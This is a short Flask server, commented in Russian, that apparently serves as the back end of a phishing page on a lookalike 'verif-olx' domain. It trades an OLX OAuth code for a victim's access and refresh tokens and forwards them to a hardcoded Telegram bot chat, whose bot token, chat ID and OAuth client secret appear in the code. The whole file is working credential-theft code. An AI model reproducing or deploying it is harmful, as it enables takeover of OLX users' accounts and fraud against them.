from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__)

# ---- ПЕРЕМЕННЫЕ ----
# Railway Environment Variables будут подставлены через os.environ
TG_TOKEN = os.environ.get("TG_TOKEN", "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")

# ---- Функция отправки сообщений в Telegram ----
def send_telegram_message(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        print("Telegram error:", e)

# ---- Главная страница ----
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# ---- Получение токена OLX через OAuth ----
@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')

    if not code:
        return jsonify({"error": "No code"}), 400

    url = 'https://www.olx.ua/api/open/oauth/token'
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write'
    }

    try:
        response = requests.post(url, data=payload, headers={'User-Agent': 'Mozilla/5.0'})
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            refresh = res_json.get('refresh_token')

            msg = f"🚀 <b>OLX AUTH LOG</b>\n\nAccess: <code>{access}</code>\n\nRefresh: <code>{refresh}</code>"
            send_telegram_message(msg)
            return jsonify(res_json), 200
        else:
            return jsonify({"error": response.text}), response.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---- Запуск сервера ----
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
